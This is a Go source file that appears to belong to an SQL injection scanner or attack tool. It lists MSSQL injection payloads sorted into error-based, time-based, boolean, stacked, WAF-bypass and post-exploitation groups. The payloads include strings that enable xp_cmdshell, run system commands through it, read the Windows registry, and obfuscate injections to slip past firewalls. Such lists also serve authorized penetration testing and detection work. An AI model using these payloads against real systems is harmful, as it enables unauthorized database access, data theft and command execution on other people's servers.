package payloads

var MSSQL = PayloadGroup{
	DBMS: "MSSQL",
	Payloads: []Payload{
		{Type: "error", Content: "' AND 1=CONVERT(int, (select user_name()))--"},
		{Type: "time", Content: "'; WAITFOR DELAY '0:0:5'--"},
		{Type: "boolean", Content: "' AND 1=1--"},
		{Type: "boolean", Content: "' AND (SELECT 'a')='a'--"},
		{Type: "error", Content: "' AND 1=CONVERT(int,@@version)--"},
		{Type: "error", Content: "' AND 1=db_name()--"},
		{Type: "stacked", Content: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"},

		// ADVANCED MSSQL PAYLOADS
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT @@VERSION))--"},

		// TIME-BASED ADVANCED
		{Type: "time", Content: "'; IF (1=1) WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sys.objects) ELSE 0 END)--"},

		// BOOLEAN-BASED
		{Type: "boolean", Content: "' AND IS_SRVROLEMEMBER('sysadmin')=1--"},
		{Type: "boolean", Content: "' AND (SELECT 'a')='a'--"},

		// WAF BYPASS
		{Type: "error", Content: "'%20OR%201=1--"},
		{Type: "error", Content: "';%0AWAITFOR%20DELAY%20'0:0:5'--"},
		{Type: "error", Content: "';/**/WAITFOR/**/DELAY/**/'0:0:5'--"},

		// POST-EXPLOITATION
		{Type: "deep", Content: "'; EXEC master..xp_cmdshell 'whoami'--"},
		{Type: "deep", Content: "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--"},
	},
}
